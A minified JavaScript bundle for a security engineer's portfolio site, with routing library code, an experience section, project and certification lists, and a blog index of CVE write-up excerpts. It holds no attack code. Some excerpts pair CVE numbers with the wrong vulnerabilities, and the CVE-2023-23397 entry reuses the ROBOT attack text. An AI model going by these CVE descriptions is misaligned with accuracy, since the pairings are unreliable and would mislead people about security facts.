0:r.errors;if(l!=null){let p=a.findIndex(d=>d.route.id&&(l==null?void 0:l[d.route.id])!==void 0);p>=0||q(!1),a=a.slice(0,Math.min(a.length,p+1))}let o=!1,c=-1;if(t&&s&&s.v7_partialHydration)for(let p=0;p<a.length;p++){let d=a[p];if((d.route.HydrateFallback||d.route.hydrateFallbackElement)&&(c=p),d.route.id){let{loaderData:h,errors:v}=t,y=d.route.loader&&h[d.route.id]===void 0&&(!v||v[d.route.id]===void 0);if(d.route.lazy||y){o=!0,c>=0?a=a.slice(0,c+1):a=[a[0]];break}}}return a.reduceRight((p,d,h)=>{let v,y=!1,w=null,x=null;t&&(v=l&&d.route.id?l[d.route.id]:void 0,w=d.route.errorElement||pg,o&&(c<0&&h===0?(kg("route-fallback"),y=!0,x=null):c===h&&(y=!0,x=d.route.hydrateFallbackElement||null)));let m=n.concat(a.slice(0,h+1)),f=()=>{let g;return v?g=w:y?g=x:d.route.Component?g=b.createElement(d.route.Component,null):d.route.element?g=d.route.element:g=p,b.createElement(hg,{match:d,routeContext:{outlet:p,matches:m,isDataRoute:t!=null},children:g})};return t&&(d.route.ErrorBoundary||d.route.errorElement||h===0)?b.createElement(dg,{location:t.location,revalidation:t.revalidation,component:w,error:v,children:f(),routeContext:{outlet:null,matches:m,isDataRoute:!0}}):f()},null)}var _d=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(_d||{}),Ed=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(Ed||{});function mg(e){let n=b.useContext(no);return n||q(!1),n}function gg(e){let n=b.useContext(rg);return n||q(!1),n}function vg(e){let n=b.useContext(On);return n||q(!1),n}function Td(e){let n=vg(),t=n.matches[n.matches.length-1];return t.route.id||q(!1),t.route.id}function yg(){var e;let n=b.useContext(kd),t=gg(),s=Td();return n!==void 0?n:(e=t.errors)==null?void 0:e[s]}function wg(){let{router:e}=mg(_d.UseNavigateStable),n=Td(Ed.UseNavigateStable),t=b.useRef(!1);return bd(()=>{t.current=!0}),b.useCallback(function(r,i){i===void 0&&(i={}),t.current&&(typeof r=="number"?e.navigate(r):e.navigate(r,_s({fromRouteId:n},i)))},[e,n])}const Ec={};function kg(e,n,t){Ec[e]||(Ec[e]=!0)}function bg(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function un(e){q(!1)}function xg(e){let{basename:n="/",children:t=null,location:s,navigationType:r=yn.Pop,navigator:i,static:a=!1,future:l}=e;js()&&q(!1);let o=n.replace(/^\/*/,"/"),c=b.useMemo(()=>({basename:o,navigator:i,static:a,future:_s({v7_relativeSplatPath:!1},l)}),[o,l,i,a]);typeof s=="string"&&(s=Ot(s));let{pathname:p="/",search:d="",hash:h="",state:v=null,key:y="default"}=s,w=b.useMemo(()=>{let x=eo(p,o);return x==null?null:{location:{pathname:x,search:d,hash:h,state:v,key:y},navigationType:r}},[o,p,d,h,v,y,r]);return w==null?null:b.createElement(et.Provider,{value:c},b.createElement(vi.Provider,{children:t,value:w}))}function Sg(e){let{children:n,location:t}=e;return og(Xa(n),t)}new Promise(()=>{});function Xa(e,n){n===void 0&&(n=[]);let t=[];return b.Children.forEach(e,(s,r)=>{if(!b.isValidElement(s))return;let i=[...n,r];if(s.type===b.Fragment){t.push.apply(t,Xa(s.props.children,i));return}s.type!==un&&q(!1),!s.props.index||!s.props.children||q(!1);let a={id:s.props.id||i.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(a.children=Xa(s.props.children,i)),t.push(a)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ka(){return Ka=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Ka.apply(this,arguments)}function _g(e,n){if(e==null)return{};var t={},s=Object.keys(e),r,i;for(i=0;i<s.length;i++)r=s[i],!(n.indexOf(r)>=0)&&(t[r]=e[r]);return t}function Eg(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function Tg(e,n){return e.button===0&&(!n||n==="_self")&&!Eg(e)}const Cg=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],Ng="6";try{window.__reactRouterVersion=Ng}catch{}const Ag="startTransition",Tc=yh[Ag];function Pg(e){let{basename:n,children:t,future:s,window:r}=e,i=b.useRef();i.current==null&&(i.current=Lm({window:r,v5Compat:!0}));let a=i.current,[l,o]=b.useState({action:a.action,location:a.location}),{v7_startTransition:c}=s||{},p=b.useCallback(d=>{c&&Tc?Tc(()=>o(d)):o(d)},[o,c]);return b.useLayoutEffect(()=>a.listen(p),[a,p]),b.useEffect(()=>bg(s),[s]),b.createElement(xg,{basename:n,children:t,location:l.location,navigationType:l.action,navigator:a,future:s})}const Lg=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",Rg=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Ie=b.forwardRef(function(n,t){let{onClick:s,relative:r,reloadDocument:i,replace:a,state:l,target:o,to:c,preventScrollReset:p,viewTransition:d}=n,h=_g(n,Cg),{basename:v}=b.useContext(et),y,w=!1;if(typeof c=="string"&&Rg.test(c)&&(y=c,Lg))try{let g=new URL(window.location.href),k=c.startsWith("//")?new URL(g.protocol+c):new URL(c),_=eo(k.pathname,v);k.origin===g.origin&&_!=null?c=_+k.search+k.hash:w=!0}catch{}let x=ig(c,{relative:r}),m=Og(c,{replace:a,state:l,target:o,preventScrollReset:p,relative:r,viewTransition:d});function f(g){s&&s(g),g.defaultPrevented||m(g)}return b.createElement("a",Ka({},h,{href:y||x,onClick:w||i?s:f,ref:t,target:o}))});var Cc;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Cc||(Cc={}));var Nc;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(Nc||(Nc={}));function Og(e,n){let{target:t,replace:s,state:r,preventScrollReset:i,relative:a,viewTransition:l}=n===void 0?{}:n,o=xd(),c=Is(),p=Sd(e,{relative:a});return b.useCallback(d=>{if(Tg(d,t)){d.preventDefault();let h=s!==void 0?s:Yr(c)===Yr(p);o(e,{replace:h,state:r,preventScrollReset:i,relative:a,viewTransition:l})}},[c,o,p,s,r,t,e,i,a,l])}function jg({onToggleTheme:e,theme:n}){const t=Is(),s=xd(),r=t.pathname==="/blogs",i=t.pathname.startsWith("/projects"),a=t.pathname.startsWith("/certifications"),l=t.pathname.startsWith("/cve-map"),o=t.hash==="#contact"||t.pathname==="/contact",c=(p,d)=>{p.preventDefault();const h=()=>{const v=document.getElementById(d);v&&v.scrollIntoView({behavior:"smooth",block:"start"})};t.pathname!=="/"?(s("/"),setTimeout(h,80)):h()};return u.jsx("nav",{className:"navbar",children:u.jsxs("div",{className:"container nav-container",children:[u.jsxs("div",{className:"logo",children:[u.jsx("i",{className:"fas fa-satellite-dish mug-icon","aria-hidden":"true"})," Hem Parekh // Ops HUD"]}),u.jsxs("ul",{className:"nav-links",children:[u.jsx("li",{children:u.jsx("a",{href:"#about",onClick:p=>c(p,"about"),children:"About"})}),u.jsx("li",{children:u.jsx("a",{href:"#experience",onClick:p=>c(p,"experience"),children:"Experience"})}),u.jsx("li",{children:u.jsx(Ie,{to:"/projects",className:i?"active":"",children:"Projects"})}),u.jsx("li",{children:u.jsx(Ie,{to:"/certifications",className:a?"active":"",children:"Certs"})}),u.jsx("li",{children:u.jsx(Ie,{to:"/blogs",className:r?"active":"",children:"Blog"})}),u.jsx("li",{children:u.jsx(Ie,{to:"/cve-map",className:l?"active":"",children:"CVE Map"})}),u.jsx("li",{children:u.jsx("a",{href:"#contact",className:o?"active":"",onClick:p=>c(p,"contact"),children:"Contact"})})]}),u.jsxs("button",{className:"theme-toggle",id:"themeToggle",onClick:e,children:["HUD Glow: ",n==="dark"?"On":"Off"]})]})})}function Ig(){return u.jsx("footer",{className:"footer",children:u.jsx("div",{className:"container",children:u.jsx("p",{children:"© 2024 Hem Parekh | All rights reserved."})})})}function yi(e=.15){const n=b.useRef(null),[t,s]=b.useState(!1);return b.useEffect(()=>{const r=n.current;if(!r)return;const i=new IntersectionObserver(([a])=>{a.isIntersecting&&(s(!0),i.unobserve(a.target))},{threshold:e});return i.observe(r),()=>i.disconnect()},[e]),[n,t]}function Mg({data:e}){const[n,t]=yi();return u.jsx("header",{className:`hero reveal ${t?"visible":""}`,id:"home",ref:n,children:u.jsxs("div",{className:"hero-content container",children:[u.jsxs("div",{className:"hero-copy",children:[u.jsx("div",{className:"hero-badge",children:"Operator: Hem Parekh // Signal Node 3100"}),u.jsx("h1",{children:u.jsxs("span",{"data-glitch":`Hello, I'm ${e.highlight}.`,children:["Hello, I'm ",u.jsx("span",{className:"highlight",children:e.highlight}),"."]})}),u.jsxs("div",{className:"hero-descriptors",children:[u.jsx("span",{className:"pill",children:"Security Engineer"}),u.jsx("span",{className:"pill",children:"Pen Tester"})]}),u.jsx("p",{className:"hero-funfact",children:"Low-trust runtime. Intrusions logged, anomalies hunted."}),u.jsx("p",{children:e.blurb}),u.jsxs("div",{className:"hero-ctas",children:[u.jsx(Ie,{className:"button primary clipboard",to:"/projects",children:"View Projects"}),u.jsx(Ie,{className:"button ghost clipboard",to:"/certifications",children:"View Certificates"})]}),u.jsx("div",{className:"scroll-down-arrow",children:u.jsx("a",{href:"#about",className:"arrow-link",children:u.jsx("span",{children:"↓"})})})]}),u.jsx("div",{className:"hero-photo-card",children:u.jsx("div",{className:"polaroid",children:u.jsx("img",{src:e.image,className:"heading-image glitch",alt:"Heading"})})})]})})}function Dg({links:e=[]}){return u.jsx("div",{className:"social-icons",children:e.map(n=>u.jsx("a",{href:n.href,target:"_blank",rel:"noreferrer","aria-label":n.label||"Social link",children:u.jsx("i",{className:n.icon})},n.href))})}function zg({data:e,socials:n}){const[t,s]=yi();return u.jsx("section",{className:`about reveal ${s?"visible":""}`,id:"about",ref:t,children:u.jsxs("div",{className:"container about-container",children:[u.jsx("div",{className:"about-photo",children:u.jsx("img",{src:e.image,alt:"Hem Parekh",style:{maxWidth:"100%",borderRadius:"10px"}})}),u.jsxs("div",{className:"about-content",children:[u.jsx("h2",{children:e.title}),u.jsx("p",{children:e.text}),u.jsx(Dg,{links:n})]})]})})}const Fg={"Privacy Engineer":{domains:["Privacy","Cloud"],impact:"High",capabilities:{"Privacy Reviews":!0,"Threat Modeling":!0,Automation:!0,Compliance:!0,"Incident Response":!1,"Pen Testing":!1},tools:["AWS","Splunk","Python","Terraform"],outcome:"Cut data exposure paths; embedded privacy-by-design across services. Built repeatable reviews and automated kill-switches.",actions:[]},"Cybersecurity Engineer Intern":{domains:["AppSec","Infra"],impact:"High",capabilities:{"Pen Testing":!0,"Threat Modeling":!0,Automation:!0,Compliance:!0,"Incident Response":!1,"Privacy Reviews":!1},outcome:"8 critical issues fixed; 25+ web apps hardened.",actions:[]},"Research Assistant":{domains:["Research","Compliance"],impact:"Medium",capabilities:{Compliance:!0,"Threat Modeling":!0,"Privacy Reviews":!0,Automation:!1,"Pen Testing":!1,"Incident Response":!1},tools:["NIST 800-53","ISO 27001","Python"],outcome:"Risk assessments aligned to NIST/ISO; controls implemented with teams.",actions:[]},"Cybersecurity Analyst Intern":{domains:["AppSec","Infra"],impact:"Medium",capabilities:{"Pen Testing":!0,"Threat Modeling":!0,Compliance:!0,Automation:!1,"Incident Response":!1,"Privacy Reviews":!1},tools:["Nessus","Burp","Splunk"],outcome:"Assessed 18 internal systems; delivered remediation guidance.",actions:[]},"Security Operational Analyst (SOC)":{domains:["Detection","Operations"],impact:"Medium",capabilities:{"Incident Response":!0,"Threat Modeling":!1,"Pen Testing":!1,Compliance:!1,Automation:!0,"Privacy Reviews":!1},outcome:"Monitored 100+ devices; improved alert handling and root-cause analysis.",actions:[]}};function Bg({item:e,idx:n}){const[t,s]=yi(),r=Fg[e.role]||{},i=r.domains||[],a=r.capabilities||{},l=r.actions||[e.desc];return u.jsxs("article",{className:`exp-card reveal ${s?"visible":""} card-hover`,ref:t,style:{transitionDelay:`${n*80}ms`},children:[u.jsxs("header",{className:"exp-card-header",children:[u.jsxs("div",{children:[u.jsx("h3",{children:e.role}),u.jsx("h4",{children:e.org})]}),u.jsx("div",{className:"exp-dates",children:e.range})]}),u.jsxs("div",{className:"exp-chips",children:[i.map(o=>u.jsx("span",{className:"pill",children:o},o)),r.impact&&u.jsxs("span",{className:"pill impact",children:["Impact: ",r.impact]})]}),u.jsx("div",{className:"exp-outcome",children:r.outcome||e.desc}),u.jsx("div",{className:"exp-capabilities",children:Object.entries(a).map(([o,c])=>u.jsxs("div",{className:`exp-cap ${c?"on":"off"}`,children:[u.jsx("span",{className:"dot-cap"}),o]},o))}),u.jsx("ul",{className:"exp-actions",children:l.map(o=>u.jsx("li",{children:o},o))})]},`${e.range}-${e.role}`)}function Ug({items:e}){const[n,t]=yi(.1);return u.jsx("section",{className:`experience reveal ${t?"visible":""}`,id:"experience",ref:n,children:u.jsxs("div",{className:"container",children:[u.jsx("div",{className:"section-header",children:u.jsxs("div",{children:[u.jsx("h2",{children:"EXPERIENCE"}),u.jsx("p",{className:"section-subtitle",children:"Field reports from building and breaking systems."})]})}),u.jsx("div",{className:"experience-grid",children:e.map((s,r)=>u.jsx(Bg,{item:s,idx:r},`${s.range}-${s.role}`))})]})})}function Hg(e,n,t){if(!e||typeof window>"u")return{position:n,size:t};try{const s=window.localStorage.getItem(e);if(!s)return{position:n,size:t};const r=JSON.parse(s);return{position:r.position||n,size:r.size||t}}catch{return{position:n,size:t}}}function Vg(e,n,t){if(!(!e||typeof window>"u"))try{const s=JSON.stringify({position:n,size:t});window.localStorage.setItem(e,s)}catch{}}function Wg(e={x:0,y:0},n,t){const s=b.useRef(null),r=b.useRef(null),i=b.useRef(null),a=Hg(t,e,n),[l,o]=b.useState(a.position),[c,p]=b.useState(a.size),[d,h]=b.useState(!1),[v,y]=b.useState(!1),w=b.useRef(a.position),x=b.useRef(a.size);return b.useEffect(()=>{Vg(t,l,c)},[l,c,t]),b.useEffect(()=>{if(!t||typeof window>"u")return()=>{};const m=f=>{if(!(f!=null&&f.detail&&f.detail!=="all"&&f.detail!==t)){w.current=e,x.current=n,o(e),p(n);try{window.localStorage.removeItem(t)}catch{}}};return window.addEventListener("hud:reset-layout",m),()=>window.removeEventListener("hud:reset-layout",m)},[t,e,n]),b.useEffect(()=>{const m=s.current,f=r.current||m;if(!m||!f)return()=>{};let g={x:0,y:0},k=w.current;const _=E=>{E.button&&E.button!==0||(g={x:E.clientX,y:E.clientY},k=w.current,h(!0),document.addEventListener("pointermove",T),document.addEventListener("pointerup",C))},T=E=>{const I={x:E.clientX-g.x,y:E.clientY-g.y},P={x:k.x+I.x,y:k.y+I.y};w.current=P,o(P)},C=()=>{h(!1),document.removeEventListener("pointermove",T),document.removeEventListener("pointerup",C)};return f.addEventListener("pointerdown",_),()=>{f.removeEventListener("pointerdown",_),document.removeEventListener("pointermove",T),document.removeEventListener("pointerup",C)}},[]),b.useEffect(()=>{const m=s.current,f=i.current;if(!m||!f)return()=>{};let g={x:0,y:0},k=x.current||{width:m.offsetWidth,height:m.offsetHeight};const _=E=>{E.button&&E.button!==0||(g={x:E.clientX,y:E.clientY},k=x.current||{width:m.offsetWidth,height:m.offsetHeight},y(!0),document.addEventListener("pointermove",T),document.addEventListener("pointerup",C))},T=E=>{const I={x:E.clientX-g.x,y:E.clientY-g.y},P={width:Math.max(320,k.width+I.x),height:Math.max(260,k.height+I.y)};x.current=P,p(P)},C=()=>{y(!1),document.removeEventListener("pointermove",T),document.removeEventListener("pointerup",C)};return f.addEventListener("pointerdown",_),()=>{f.removeEventListener("pointerdown",_),document.removeEventListener("pointermove",T),document.removeEventListener("pointerup",C)}},[]),{nodeRef:s,handleRef:r,resizerRef:i,position:l,setPosition:o,size:c,setSize:p,isDragging:d,isResizing:v}}function Wn({title:e,subtitle:n,id:t,children:s,initialPosition:r={x:0,y:0},initialSize:i}){const a=b.useId(),l=t||`window-${a}`,{nodeRef:o,handleRef:c,resizerRef:p,position:d,size:h,isDragging:v,isResizing:y}=Wg(r,i,`hud:window:${l}`);return u.jsxs("section",{className:`hud-window ${v?"dragging":""} ${y?"resizing":""}`,id:l,ref:o,style:{transform:`translate3d(${d.x}px, ${d.y}px, 0)`,width:h!=null&&h.width?`${h.width}px`:void 0,height:h!=null&&h.height?`${h.height}px`:void 0},children:[u.jsxs("div",{className:"hud-window__chrome",children:[u.jsxs("div",{className:"hud-window__header",ref:c,title:"drag to reposition",children:[u.jsxs("div",{className:"hud-window__title",children:[u.jsx("span",{className:"led on"}),u.jsx("span",{className:"hud-label",children:e})]}),u.jsxs("div",{className:"hud-window__meta",children:[u.jsx("span",{className:"hud-chip",children:n||"interactive"}),u.jsx("span",{className:"hud-chip ghost",children:"drag / resize"})]})]}),u.jsxs("div",{className:"hud-window__body",children:[u.jsx("div",{className:"hud-scanline"}),s]})]}),u.jsx("div",{className:"hud-window__resizer",ref:p,title:"resize"})]})}const $g=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],Gg={title:"Hello, I'm Hem Parekh.",highlight:"Hem Parekh",image:"/images/heading_image.webp",blurb:"Security engineer and pen tester building hardened systems, staging exploit labs, and mapping attack surfaces before adversaries do."},Yg={title:"ABOUT ME",image:"/images/profile.jpeg",text:"I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building resilient software and unearthing vulnerabilities. I blend engineering discipline with a hacker’s curiosity to design secure systems and to stress-test the ones that already exist. When I’m not pulling threads on a bug, I’m writing up what I find so other defenders can move faster."},qg=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],Xg=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],Kg=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],Qg={title:"Ops Log // Latest Signals",subtitle:"Field notes from exploit labs, CVE hunts, and defensive experiments.",social:[{href:"#",icon:"fab fa-twitter"},{href:"#",icon:"fab fa-linkedin-in"},{href:"#",icon:"fab fa-github"},{href:"#",icon:"fab fa-instagram"}]},Qa=[{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how 